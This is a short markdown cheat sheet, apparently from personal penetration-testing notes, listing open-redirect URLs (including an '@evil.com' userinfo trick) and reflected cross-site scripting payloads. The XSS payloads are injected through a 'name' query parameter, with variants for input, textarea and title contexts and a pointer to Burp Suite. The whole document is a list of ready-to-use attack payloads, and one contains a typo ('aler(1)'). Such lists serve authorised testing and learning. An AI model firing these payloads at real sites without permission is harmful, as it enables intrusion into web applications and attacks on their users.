# Open redirect

- __`https://test.com/?redirect=https://www.google.com`__
- __`https://test.com/?redirect=https://www.google.com@evil.com`__


# Cross-Site Scripting (XSS)

- __`/?name=">test123`__
- __`/?name=">test123<script>alert(1)</script>`__
- __`/?name=">test123<script>alert(1);//</script>`__
- __`/?name=">test123<image src=x onerror=alert()>`__
- __`/?name=">test123<image src=x onmouseover=alert()>`__
- __`/?name=">test123<image src=x onmouseover=document.write(1)>`__
- __`/?name=javascript:alert()` or `/?name=<a href=javascript:alert(1)>test123`__
- __`/?name=<iframe src=javascript:alert(1)>`__
- __`/?name=<object data="data:text/html,<script>alert(1)</script>"></object>`__
- __`/?name=<object data="data:text/javascript,<h1>test123"></object>`__
- __`/?name=<script src=data:text/javascript,alert(1337)></script>`__
- __`/?name="><h1><u/onmouseover=alert(1)>test123`__

#### for "input" tag
- __`/?name=test123" onmouseover=aler(1);//`__

#### for <textarea>
- __`/?name=test123</textarea><img/src=x onerror=alert(2)>`__


#### for </title>
- __`/?name=test123</title><img/src=x onerror=alert(2)>`__


- > __If you are not getting /?name=test123 in url you can use burpsuite__
  - ![image1](https://github.com/Chittu13/All_in_one/blob/main/image/image1.png)
